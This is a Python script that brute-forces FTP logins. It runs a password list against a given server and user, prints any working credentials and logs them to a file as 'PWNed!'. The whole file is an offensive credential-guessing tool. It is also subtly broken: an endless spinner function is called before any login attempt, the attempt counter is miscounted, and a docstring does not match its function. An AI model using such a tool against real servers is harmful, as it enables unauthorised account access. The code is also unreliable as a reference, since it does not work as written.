#!/usr/bin/env python3


import ftplib
import os
import time
import sys

# Constants, global flags
CWD = os.getcwd()
FTPLOG = os.path.join(CWD, 'ftp_bruteforce.log')

def spin():
    import time
    """Prints spinning timer bar(s)
    Stops when ARG 'found' (global 'isfound') evaluates to True.
    Default: 10 bars + autostop if NO ARGS given"""

    while True:
        spinner = "\\|/-"

        #print("----------\r", end='', flush=True)

        for pos in range(10):
            print("-", end='', flush=True)
            for spin in range(25):
                time.sleep(0.1)
                print("\b" + spinner[spin % 4], end='', flush=True)
            print("\b|", end='', flush=True)



def ftp_bruteforce(server, user, password_list):
    """Attempt FTP bruteforce"""
    with open(password_list, 'r') as passwords:
        tries = 0
        spin()
        for password in passwords:
            password = password.strip()
            try:
                ftp_con = ftplib.FTP(server, user, password)
                if ftp_con:
                    print(f'[+] Success! Connected to FTP server {server} with user {user} and password {password} (try #{tries})')
                    tries += 1
                    # Log success to file
                    log_success(server, user, password, tries)
                    return tries
            except ftplib.error_perm as e:
                print(f'[-] FTP error: {e}')
            except Exception as e:
                print(f'[-] Error: {e}')
    return None

def log_success(server, user, password, tries):
    """Log successful login to file"""
    CURRENT_TIME = time.strftime('%Y-%m-%d %H:%M:%S')
    LOGLINE = f'[+] PWNed! Server: {server} with username: {user} and password {password} (try #{tries} @ {CURRENT_TIME})\n'

    with open(FTPLOG, 'a+') as ftp_log:
        ftp_log.write(LOGLINE)

def usage():
    return f"Usage: python3 script.py <server> <user> <password_list>"

def main(*args, **kwargs):
    try:
        server, user, password_list = sys.argv[1:]
        result = ftp_bruteforce(server, user, password_list)
        
        if result is not None:
            sys.exit(0)
        
    except Exception as e:
        print(f"[-] There was a problem executing the script")
        print(usage())
    
    sys.exit(1)


if __name__ == '__main__':
    # Command-line arguments: python script.py server user password_list
    if len(sys.argv) != 4:
        sys.exit(usage())

    server, user, password_list = sys.argv[1:4]
    main(server, user, password_list)
